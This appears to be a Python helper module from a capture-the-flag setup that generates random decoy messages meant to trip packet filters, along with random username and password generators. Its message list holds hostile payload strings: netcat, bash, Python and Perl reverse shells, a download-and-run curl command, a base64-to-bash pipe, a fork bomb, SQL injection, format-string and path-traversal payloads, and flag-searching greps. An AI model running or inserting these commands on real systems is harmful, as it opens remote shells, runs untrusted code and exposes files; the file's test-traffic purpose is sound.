import random
import secrets
import os
import base64
import string



def get_random_ip():
    return "fd66:666:{:x}:ffff::{:x}".format(random.randint(0,4096), random.randint(0,255))


def rand_fmt():
    offset = lambda: random.choice(["", f"{random.randint(4, 128)}$"])
    width = lambda: random.choice(["", str(random.randint(24, 65535))])
    length = lambda: random.choice(["hh", "h", "l", "ll", "z", ""])
    conversion = lambda: random.choice(["n", "d", "x", "c", "s", ""])

    return ''.join(["%{}{}{}{}".format(offset(), width(), length(), conversion()) for i in range(random.randint(4, 16))])


def generate_message():
    "returns a string that hopefully triggers some packet filtering"

    return random.choice([
        rand_fmt(),
        os.urandom(random.randint(4, 128)).hex(),
	base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
  	'A' * random.randint(4, 16),
	'B' * random.randint(4, 16),
        "%90" * random.randint(4, 16),
        random.choice(["%c3", "%C3"]) * random.randint(4, 16),
	'Never gonna give you up, never gonna let you down',
        '/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
        '/bin/sh -c "/bin/{} -e /bin/sh {} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), get_random_ip(), random.randint(1024, 65535)),
        '/bin/bash -i >& /dev/tcp/ {}/{} 0>&1'.format(get_random_ip(), random.randint(1024, 65535)),
        "find / -type f -exec grep 'FAUST_' {} \\;",
        "grep -R . -e 'FAUST'",
        "curl http://[{}]:{}/{} -o /tmp/foo && ./foo && rm /tmp/foo".format(get_random_ip(), random.randint(1024, 65535), secrets.token_hex(8)),
        "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"fd66:666:{:x}:ffff::{:x}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'".format(random.randint(0,4096), random.randint(0,255), random.randint(1024, 65535)),
        "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(get_random_ip(), random.randint(1024, 65535)),
        "' OR 1=1; --",
        "echo {} | base64 -d | bash".format(base64.b64encode(os.urandom(random.randint(4, 128))).decode()),
        ":(){ :|:& };:",
        random.choice([
            "{}%2fetc%2fpasswd".format("%2f".join([".."] * random.randint(4, 8))),
            "{}%2Fetc%2Fpasswd".format("%2F".join([".."] * random.randint(4, 8))),
            "{}%2fetc%2fpasswd".format("%2f".join(["%2e%2e"] * random.randint(4, 8))),
            "{}%2Fetc%2Fpasswd".format("%2F".join(["%2E%2E"] * random.randint(4, 8)))
        ])
    ])


ALPHABET = string.ascii_letters + string.digits


def random_user(min=8, max=16):
    return ''.join([random.choice(ALPHABET) for i in range(random.randint(min, max))])


def random_password(min=4, max=64):
    return ''.join([random.choice(ALPHABET) for i in range(random.randint(min, max))])


def randfloat(start, end):
    return random.random() * (end - start) + start
